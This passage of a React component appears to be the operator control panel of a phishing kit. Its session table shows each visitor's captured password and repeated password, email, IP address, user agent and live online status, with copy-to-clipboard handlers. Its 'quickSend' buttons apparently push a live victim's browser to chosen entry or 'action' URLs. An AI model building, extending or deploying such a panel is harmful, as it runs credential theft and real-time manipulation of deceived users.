                            <button className="refresh-btn" onClick={(e) => { e.stopPropagation(); const sess = sessions.find(x => x._id === s._id); if (sess && sess.entryUrl) { const bc = sess.baseCode || ''; const entryBase = (allLinks.find(l => l.baseCode === bc) || {}).baseUrl || ''; const target = entryBase ? (entryBase.replace(/\/$/,'') + '/' + userCode + '_' + bc) : (sess.entryUrl); quickSend(s._id, target, ''); } }} title="Send back to entry URL">🔄</button>
                          </div>
                        </td>
                        <td style={{ ...tdS, textAlign: "left", paddingTop: 1, paddingBottom: 1 }}><div className={`fld${!passVal ? " empty" : ""}`} title={passVal || "No password"} onClick={(e) => { e.stopPropagation(); if(passVal) navigator.clipboard.writeText(passVal); }}>{passVal || "—"}</div></td>
                        <td style={{ ...tdS, textAlign: "left", paddingTop: 1, paddingBottom: 1 }}><div className={`fld${!rePassVal ? " empty" : ""}`} title={rePassVal || "No re-password"} onClick={(e) => { e.stopPropagation(); if(rePassVal) navigator.clipboard.writeText(rePassVal); }}>{rePassVal || "—"}</div></td>
                        <td style={{ ...tdS, textAlign: "center" }}>
                          <span style={{ display: "inline-flex", alignItems: "center", justifyContent: "center", background: clkCount > 0 ? "rgba(245,158,11,0.12)" : "var(--bg-secondary)", border: `1px solid ${clkCount > 0 ? "#f59e0b" : "var(--card-border)"}`, borderRadius: 6, padding: "4px 10px", fontWeight: 800, fontSize: 13, color: clkCount > 0 ? "#f59e0b" : "var(--text-muted)", position: "relative", cursor: "default", minWidth: 34, lineHeight: 1.3 }}>
                            {clkCount}
                            {showNewBadge && (<span style={{ position: "absolute", top: -9, right: -11, background: "#ef4444", color: "#fff", borderRadius: 8, padding: "1px 5px", fontSize: 8, fontWeight: 700, whiteSpace: "nowrap", boxShadow: "0 1px 4px rgba(239,68,68,0.4)" }}>NEW</span>)}
                          </span>
                        </td>
                        <td style={{ ...tdS, textAlign: "center" }}>
                          <button onClick={(e) => { e.stopPropagation(); openInfoModal(s); }} style={{ background: "#6366f1", border: "none", cursor: "pointer", fontSize: 11, padding: "5px 11px", borderRadius: 5, color: "#fff", fontWeight: 600, whiteSpace: "nowrap", boxShadow: "0 1px 4px rgba(99,102,241,0.2)" }}>ℹ️ Info</button>
                        </td>
                        <td style={{ ...tdS, textAlign: "center" }}>
                          <button onClick={(e) => { e.stopPropagation(); toggleExpand(s._id); }} style={{ background: isExp ? "var(--accent)" : "#f59e0b", border: "none", cursor: "pointer", fontSize: 11, padding: "5px 11px", borderRadius: 5, color: isExp ? "#0F172A" : "#fff", fontWeight: 600, transition: "all 0.15s", whiteSpace: "nowrap", boxShadow: isExp ? "none" : "0 1px 4px rgba(245,158,11,0.2)" }}>{isExp ? "▲ Close" : "⚡ See More"}</button>
                        </td>
                        <td style={{ ...tdS, textAlign: "center" }}>
                          <button onClick={(e) => { e.stopPropagation(); handleReplyEmail(emailVal); }} disabled={!emailVal || emailVal === "—"} style={{ background: emailVal && emailVal !== "—" ? "#ea4335" : "var(--bg-secondary)", border: "none", cursor: emailVal && emailVal !== "—" ? "pointer" : "default", fontSize: 17, padding: "3px 8px", borderRadius: 5, color: "#fff", fontWeight: 600, whiteSpace: "nowrap", opacity: emailVal && emailVal !== "—" ? 1 : 0.35, lineHeight: 1 }} title={emailVal && emailVal !== "—" ? `Reply to ${emailVal}` : "No email"}>✉️</button>
                        </td>
                        <td style={{ ...tdS, textAlign: "center", fontSize: 11, color: "var(--text-muted)", fontWeight: 600, whiteSpace: "nowrap" }}>
                          {isLive ? (
                            <span style={{ display: "inline-flex", alignItems: "center", gap: 5, background: "rgba(34,197,94,0.12)", border: "1px solid #22c55e", borderRadius: 12, padding: "3px 10px", fontSize: 10, fontWeight: 700, color: "#22c55e" }}>
                              <span style={{ width: 6, height: 6, borderRadius: "50%", background: "#22c55e", display: "inline-block", animation: "pulse 2s infinite" }}></span>
                              Online
                            </span>
                          ) : (
                            timeAgo(lastActivity)
                          )}
                        </td>
                      </tr>
                      {isExp && (
                        <tr><td colSpan={15} style={{ padding: 0 }}><div style={{ background: "var(--bg)", border: "1px solid var(--card-border)", margin: "2px 5px", borderRadius: 5, overflow: "hidden" }}><div style={{ display: "flex", borderBottom: "1px solid var(--card-border)", background: "var(--bg-secondary)" }}>{tabs.map(t => (<button key={t.key} onClick={() => setTab(s._id, t.key)} style={{ flex: 1, padding: "12px 3px", border: "none", cursor: "pointer", fontWeight: 600, fontSize: 12, background: activeTab[s._id] === t.key ? "var(--accent)" : "transparent", color: activeTab[s._id] === t.key ? "#0F172A" : "var(--text-muted)", whiteSpace: "nowrap", textAlign: "center", transition: "all 0.15s" }}>{t.label}</button>))}</div>{renderExpandedContent(activeTab[s._id] || "transfer", s, (s.entryUrl || s.trackingCode || ""))}</div></td></tr>
                      )}
                    </React.Fragment>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {showInfoModal && infoSession && (
        <div onClick={() => setShowInfoModal(false)} style={{ position: "fixed", top: 0, left: 0, width: "100vw", height: "100vh", background: "rgba(0,0,0,0.7)", zIndex: 9999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div onClick={e => e.stopPropagation()} style={{ background: "var(--card-bg)", border: "1px solid var(--card-border)", borderRadius: 12, padding: 24, width: 580, maxWidth: "92%", maxHeight: "80vh", overflowY: "auto", boxShadow: "0 20px 50px rgba(0,0,0,0.5)" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 18 }}><h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, color: "var(--text)" }}>ℹ️ Session Info</h3><button onClick={() => setShowInfoModal(false)} style={{ background: "transparent", border: "none", color: "var(--text-muted)", fontSize: 20, cursor: "pointer" }}>✕</button></div>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
              {[{ label: "Entry URL", value: infoSession.entryUrl || "—" },{ label: "Current URL", value: infoSession.currentUrl || "—" },{ label: "IP Address", value: infoSession.ip || "—" },{ label: "Device", value: infoSession.deviceType || "N/A" },{ label: "Browser", value: (infoSession.browser || "N/A").substring(0, 35) },{ label: "Clicks", value: infoSession.clicks || 0 },{ label: "Status", value: infoSession.isLive ? "🟢 Live" : "🔴 Offline" },{ label: "Tracking Code", value: infoSession.trackingCode || "—" },{ label: "First Seen", value: new Date(infoSession.timestamp).toLocaleString() },{ label: "Last Activity", value: new Date(infoSession.lastActivity).toLocaleString() }].map((item, idx) => (<div key={idx} onClick={() => { if(item.value && item.value !== "—") navigator.clipboard.writeText(String(item.value)); }} style={{ background: "var(--bg-secondary)", padding: "8px 10px", borderRadius: 6, border: "1px solid var(--card-border)", cursor: "pointer" }}><div style={{ fontSize: 9, color: "var(--text-muted)", marginBottom: 3, textTransform: "uppercase", fontWeight: 600 }}>{item.label}</div><div style={{ fontSize: 12, color: "var(--text)", wordBreak: "break-all", fontWeight: 500 }}>{item.value}</div></div>))}
            </div>
            <div style={{ marginTop: 10, background: "var(--bg-secondary)", padding: "8px 10px", borderRadius: 6, border: "1px solid var(--card-border)", cursor: "pointer" }} onClick={() => { if(infoSession.browser) navigator.clipboard.writeText(infoSession.browser); }}><div style={{ fontSize: 9, color: "var(--text-muted)", marginBottom: 3, textTransform: "uppercase", fontWeight: 600 }}>User Agent</div><div style={{ fontSize: 11, color: "var(--text)", wordBreak: "break-all" }}>{infoSession.browser || "N/A"}</div></div>
          </div>
        </div>
      )}

      {totalPages > 1 && !clearing && (
        <div style={{ display: "flex", gap: 10, justifyContent: "center", alignItems: "center", padding: 14 }}>
          <button onClick={() => setCurrentPage(p => Math.max(1, p - 1))} disabled={currentPage === 1} style={{ padding: "7px 14px", fontSize: 12, fontWeight: 600, background: "var(--bg-secondary)", color: "var(--accent)", border: "1px solid var(--accent)", borderRadius: 4, cursor: currentPage === 1 ? "not-allowed" : "pointer", opacity: currentPage === 1 ? 0.5 : 1 }}>← Prev</button>
          <span style={{ fontSize: 12, color: "var(--text-muted)", fontWeight: 500 }}>Page <strong style={{ color: "var(--text)" }}>{currentPage}</strong> of <strong style={{ color: "var(--text)" }}>{totalPages}</strong></span>
          <button onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))} disabled={currentPage === totalPages} style={{ padding: "7px 14px", fontSize: 12, fontWeight: 600, background: "var(--bg-secondary)", color: "var(--accent)", border: "1px solid var(--accent)", borderRadius: 4, cursor: currentPage === totalPages ? "not-allowed" : "pointer", opacity: currentPage === totalPages ? 0.5 : 1 }}>Next →</button>
        </div>
      )}

      {showCategoryModal && (
        <div onClick={() => setShowCategoryModal(false)} style={{ position: "fixed", top: 0, left: 0, width: "100vw", height: "100vh", background: "rgba(0,0,0,0.7)", zIndex: 9999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div onClick={e => e.stopPropagation()} style={{ background: "var(--card-bg)", border: "1px solid var(--card-border)", borderRadius: 12, padding: 22, width: 720, maxWidth: "95%", maxHeight: "80vh", overflowY: "auto", boxShadow: "0 20px 50px rgba(0,0,0,0.5)" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 14 }}><h3 style={{ margin: 0, fontSize: 15, fontWeight: 700, color: "var(--text)" }}>📂 {selectedCategory} Links</h3><button onClick={() => setShowCategoryModal(false)} style={{ background: "transparent", border: "none", color: "var(--text-muted)", fontSize: 18, cursor: "pointer", padding: "3px 7px" }}>✕</button></div>
            <div style={{ overflowX: "auto" }}><table style={{ width: "100%", borderCollapse: "collapse" }}><thead><tr style={{ borderBottom: "1px solid var(--table-border)" }}><th style={thQ}>#</th><th style={{ ...thQ, textAlign: "left" }}>Name</th><th style={{ ...thQ, textAlign: "left" }}>Category</th><th style={{ ...thQ, textAlign: "left" }}>Ready Action External URL</th><th style={thQ}>Image</th></tr></thead>
              <tbody>{quickActionLinks.filter(l => l.category === selectedCategory && l.showInInbox !== false).map((l, idx) => (<tr key={l._id} onClick={() => { quickSend(quickSid, getVisitorActionUrl(l), quickMsg); setShowCategoryModal(false); }} style={{ borderBottom: "1px solid var(--table-border)", cursor: "pointer", transition: "background 0.15s" }} onMouseEnter={(e) => { e.currentTarget.style.background = "var(--table-hover)"; }} onMouseLeave={(e) => { e.currentTarget.style.background = "transparent"; }}><td style={{ ...tdQ, textAlign: "center", color: "var(--text-muted)", fontSize: 11 }}>{idx + 1}</td><td style={{ ...tdQ, textAlign: "left", fontWeight: 600, fontSize: 12 }}>{l.name}</td><td style={{ ...tdQ, textAlign: "left", color: "var(--text-muted)", fontSize: 11 }}>{l.category}</td><td style={{ ...tdQ, textAlign: "left", fontFamily: "monospace", fontSize: 10, color: "var(--accent)" }}>{getVisitorActionUrl(l)}</td><td style={{ ...tdQ, textAlign: "center" }}>{l.imageUrl ? <img src={l.imageUrl} alt="" style={{ width: 24, height: 24, borderRadius: 4, objectFit: "cover" }} onError={(e) => { e.target.style.display = "none"; }} /> : "—"}</td></tr>))}</tbody></table></div>
          </div>
        </div>
      )}
    </div>
  );
}

const thS = { padding: "0 5px", fontSize: 10, textAlign: "center", fontWeight: 700, color: "var(--accent)", textTransform: "uppercase", letterSpacing: "0.05em", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis", lineHeight: "46px" };
const tdS = { padding: "0 5px", fontSize: 12, textAlign: "center", color: "var(--text)", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" };
const sLabel = { fontSize: 10, color: "var(--accent)", marginBottom: 5, fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.04em" };
const thQ = { padding: "11px 13px", fontSize: 9, textAlign: "center", fontWeight: 700, color: "var(--accent)", textTransform: "uppercase", letterSpacing: "0.04em", whiteSpace: "nowrap" };
const tdQ = { padding: "11px 13px", fontSize: 11, color: "var(--text)" };